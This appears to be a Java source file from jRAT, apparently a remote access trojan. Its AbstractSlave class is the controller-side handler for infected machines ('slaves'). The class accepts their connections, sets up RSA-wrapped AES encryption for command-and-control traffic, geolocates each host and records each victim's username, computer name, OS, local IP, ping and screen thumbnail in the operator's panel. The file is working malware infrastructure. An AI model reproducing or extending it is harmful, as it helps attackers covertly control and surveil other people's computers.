package se.jrat.client;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.net.Socket;
import java.security.PublicKey;
import java.util.Random;

import javax.crypto.Cipher;
import javax.crypto.CipherInputStream;
import javax.crypto.CipherOutputStream;
import javax.crypto.KeyGenerator;
import javax.crypto.SecretKey;
import javax.crypto.spec.IvParameterSpec;
import javax.swing.ImageIcon;

import se.jrat.client.crypto.GlobalKeyPair;
import se.jrat.client.exceptions.CloseException;
import se.jrat.client.io.CountingInputStream;
import se.jrat.client.io.CountingOutputStream;
import se.jrat.client.ip2c.Country;
import se.jrat.client.net.ServerListener;
import se.jrat.client.settings.CountryStatistics;
import se.jrat.client.settings.CustomID;
import se.jrat.client.settings.Settings;
import se.jrat.client.ui.frames.Frame;
import se.jrat.client.ui.panels.PanelMainLog;
import se.jrat.client.utils.FlagUtils;
import se.jrat.client.utils.Utils;
import se.jrat.common.Version;
import se.jrat.common.codec.Hex;
import se.jrat.common.crypto.Crypto;
import se.jrat.common.crypto.CryptoUtils;
import se.jrat.common.crypto.KeyExchanger;

import com.redpois0n.oslib.Distro;
import com.redpois0n.oslib.OperatingSystem;

public abstract class AbstractSlave implements Runnable {
	
	protected ServerListener connection;
	protected Socket socket;

	protected CountingInputStream inputStream;
	protected CountingOutputStream outputStream;
	protected DataOutputStream dos;
	protected DataInputStream dis;
	
	protected String computername = "";
	protected String renamedid = "";
	protected String localip = "";
	
	protected String country;
	protected PublicKey rsaKey;
	protected byte[] key;
	protected byte[] iv;
	protected boolean responded = false;
	protected boolean verified = false;
	protected boolean checked = false;
	protected boolean selected = false;
	protected boolean lock = false;
	protected long pingms = 0;
	protected long sent = 0;
	protected long received = 0;
	protected final long uniqueId = (long) (new Random()).nextInt(Integer.MAX_VALUE); // TODO change to int
	protected int ping = 0;
	protected String id;
	protected String username;
	protected ImageIcon thumbnail;
	protected String version;
	protected String osname;
	protected String arch;
	protected String longOsname;

	private String ip;
	private String host;

	public AbstractSlave(ServerListener connection, Socket socket) {
		this.connection = connection;
		this.socket = socket;

		this.ip = socket.getInetAddress().getHostAddress() + " / " + socket.getPort();
		this.host = socket.getInetAddress().getHostName();
	}

	public void initialize() throws Exception {
		this.inputStream = new CountingInputStream(socket.getInputStream());
		this.outputStream = new CountingOutputStream(socket.getOutputStream());

		this.dis = new DataInputStream(inputStream);
		this.dos = new DataOutputStream(outputStream);
		
		this.socket.setSoTimeout(connection.getTimeout());
		this.socket.setTrafficClass(24);
		
		if (Main.debug) {
			String randomCountry = SampleMode.randomCountry();
			if (randomCountry != null) {
				setCountry(randomCountry);
			}
		} else if (Settings.getGlobal().getBoolean("geoip")) {
			Country country = FlagUtils.getCountry(this);

			if (country != null) {
				this.country = country.get2cStr();

				if (this.country.equalsIgnoreCase("ZZ")) {
					this.country = "?";
				}
			} else {
				this.country = "?";
			}
		} else {
			this.country = "?";
		}

		PanelMainLog.getInstance().addEntry("Connect", this, "");
		
		KeyExchanger exchanger = new KeyExchanger(dis, dos, GlobalKeyPair.getKeyPair());
		exchanger.writePublicKey();
		exchanger.readRemotePublicKey();
		rsaKey = exchanger.getRemoteKey();
		
        KeyGenerator keyGen = KeyGenerator.getInstance("AES");
        keyGen.init(128);
        SecretKey secretKey = keyGen.generateKey();

        IvParameterSpec ivspec = CryptoUtils.getRandomIv();
        
        key = secretKey.getEncoded();
        iv = ivspec.getIV();
        byte[] encryptedKey = Crypto.encrypt(key, rsaKey, "RSA");
        byte[] encryptedIv = Crypto.encrypt(iv, rsaKey, "RSA");
        dos.writeInt(encryptedKey.length);
        dos.writeInt(encryptedIv.length);
        dos.write(encryptedKey);
        dos.write(encryptedIv);
		
		if (Main.debug) {
			Main.debug("Encryption key: " + Hex.encode(key));
			Main.debug("Encryption IV: " + Hex.encode(iv));
		}

		Cipher inCipher = CryptoUtils.getStreamCipher(Cipher.DECRYPT_MODE, secretKey, ivspec);
		Cipher outCipher = CryptoUtils.getStreamCipher(Cipher.ENCRYPT_MODE, secretKey, ivspec);
		
		this.inputStream = new CountingInputStream(new CipherInputStream(socket.getInputStream(), inCipher));
		this.outputStream = new CountingOutputStream(new CipherOutputStream(socket.getOutputStream(), outCipher));

		this.dis = new DataInputStream(inputStream);
		this.dos = new DataOutputStream(outputStream);
	}

	public AbstractSlave(String ip) {
		this.ip = ip;
	}
	

	public void writeLine(String s) {
		try {
			dos.writeShort(s.length());
			dos.writeChars(s);
		} catch (Exception ex) {
			ex.printStackTrace();
		}
	}

	public String readLine() throws Exception {
		short len = dis.readShort();

		StringBuilder builder = new StringBuilder();
		for (int i = 0; i < len; i++) {
			builder.append(dis.readChar());
		}

		String s = builder.toString();

		return s;
	}

	public ServerListener getConnection() {
		return connection;
	}

	public Socket getSocket() {
		return socket;
	}

	public String getIP() {
		return ip;
	}
	
	public String getHost() {
		return host;
	}
	
	public String getRawIP() {
		return getIP().split(" / ")[0];
	}

	public String getPort() {
		return getIP().split(" / ")[1];
	}
	
	public void closeSocket(CloseException ex) {
		try {
			socket.close();
			ex.printStackTrace();
		} catch (Exception e) {
			e.printStackTrace();
		}
	}
	
	public void writeShort(short i) throws Exception {
		dos.writeShort(i);
	}

	public short readShort() throws Exception {
		return dis.readShort();
	}

	public byte readByte() throws Exception {
		return dis.readByte();
	}

	public void writeByte(int b) throws Exception {
		dos.writeByte(b);
	}

	public boolean readBoolean() throws Exception {
		return dis.readBoolean();
	}

	public void writeBoolean(boolean b) throws Exception {
		dos.writeBoolean(b);
	}

	public int readInt() throws Exception {
		return dis.readInt();
	}

	public void writeInt(int i) throws Exception {
		dos.writeInt(i);
	}

	public long readLong() throws Exception {
		return dis.readLong();
	}

	public void writeLong(long l) throws Exception {
		dos.writeLong(l);
	}

	public void writeLine(Object obj) {
		writeLine(obj.toString());
	}
	
	public byte[] getKey() {
		return key;
	}

	public long getUniqueId() {
		return uniqueId;
	}
	
	public DataInputStream getDataInputStream() {
		return dis;
	}
	
	public DataOutputStream getDataOutputStream() {
		return dos;
	}
	
	public CountingInputStream getCountingInputStream() {
		return inputStream;
	}
	
	public CountingOutputStream getCountingOutputStream() {
		return outputStream;
	}

	public abstract void ping() throws Exception;

	public void beginPing() throws Exception {
		pingms = System.currentTimeMillis();
		ping();
	}
	
	public static AbstractSlave getFromId(long id) {
		for (AbstractSlave slave : Main.connections) {
			if (slave.getUniqueId() == id) {
				return slave;
			}
		}
		
		return null;
	}

	public int getPing() {
		return ping;
	}

	public void setPing(int ping) {
		this.ping = ping;
	}
	
	public void pong() {
		long ping = System.currentTimeMillis() - pingms;
		this.ping = (int) ping;
		
		Frame.mainModel.setValueAt(ping + " ms", Utils.getRow(3, getIP()), 4);		
	}
	
	public abstract String getDisplayName();
	
	public String getUsername() {
		return username;
	}

	public void setUsername(String username) {
		this.username = username;
		
		Frame.mainModel.setValueAt(formatUserString(), Utils.getRow(3, getIP()), 5);
	}

	public String getID() {
		return id;
	}

	public void setServerID(String serverid) {
		this.id = serverid;
		
		CustomID.CustomIDEntry entry = CustomID.getGlobal().findEntry(getRawIP());
		if (entry == null) {
			Frame.mainModel.setValueAt(getID(), Utils.getRow(3, getIP()), 1);
		} else {
			setRenamedID(entry.getName());
			Frame.mainModel.setValueAt(getRenamedID(), Utils.getRow(3, getIP()), 1);
		}
	}
	
	public String getRenamedID() {
		return renamedid;
	}

	public void setRenamedID(String renamedid) {
		this.renamedid = renamedid;
	}

	public boolean isSelected() {
		return selected;
	}

	public void setSelected(boolean selected) {
		this.selected = selected;
	}

	public ImageIcon getThumbnail() {
		return thumbnail;
	}

	public void setThumbnail(ImageIcon thumbnail) {
		this.thumbnail = thumbnail;
	}
	
	public String getCountry() {
		return country.toUpperCase();
	}

	public boolean isVerified() {
		return verified;
	}

	public String getVersion() {
		return version;
	}

	public void setVersion(String version) {
		this.version = version;

		int row = Utils.getRow(this);

		if (row != -1) {
			Frame.mainModel.setValueAt(version, row, 9);
		}
	}

	public boolean isUpToDate() {
		return getVersion().equals(Version.getVersion());
	}

	public void setVerified(boolean verified) {
		this.verified = verified;
	}
	
	public ImageIcon getFlag() {
		return FlagUtils.getFlag(country);
	}
	
	public String getArch() {
		return arch;
	}
	
	public void setArch(String arch) {
		this.arch = arch;
	}

	public String getOperatingSystem() {
		return osname;
	}

	public void setOperatingSystem(String osname) {
		this.osname = osname;
		
		Frame.mainModel.setValueAt(getOperatingSystem(), Utils.getRow(3, getIP()), 6);
	}
	
	public String getLongOperatingSystem() {
		return longOsname;
	}
	
	public void setLongOperatingSystem(String longOsname) {
		this.longOsname = longOsname;
	}
	
	public void setCountry(String country) {
		this.country = country;
		
		
		int row = Utils.getRow(this);

		if (row != -1) {
			Frame.mainModel.setValueAt(this.getCountry().toUpperCase().trim(), row, 0);
			Frame.mainTable.repaint();
		}
		
		CountryStatistics.getGlobal().add(this);
	}

	public OperatingSystem getOS() {
		//
		String os = this.getOperatingSystem().toLowerCase();
		return OperatingSystem.getOperatingSystem(os);
	}
	
	public Distro getDistro() {
		String os = this.getOperatingSystem().toLowerCase();
		return Distro.getDistro(os);
	}
	
	public String getComputerName() {
		return computername;
	}

	public void setComputerName(String name) {
		this.computername = name;
		
		Frame.mainModel.setValueAt(formatUserString(), Utils.getRow(3, getIP()), 5);
	}
	
	public String formatUserString() {
		String username = this.getUsername();
		String computerName = this.getComputerName();
		
		if (username == null) {
			username = "Unknown";
		}
		
		if (computerName == null) {
			computerName = "Unknown";
		}
		
		String s;
		
		if (this.getOS() == OperatingSystem.WINDOWS) {
			s = computerName + "\\" + username;
		} else {
			s = username + "@" + computerName;
		}
		
		return s;
	}
	
	public String getLocalIP() {
		return localip;
	}

	public void setLocalIP(String localip) {
		this.localip = localip;

		int row = Utils.getRow(this);

		Frame.mainModel.setValueAt(localip, row, 8);
	}

}
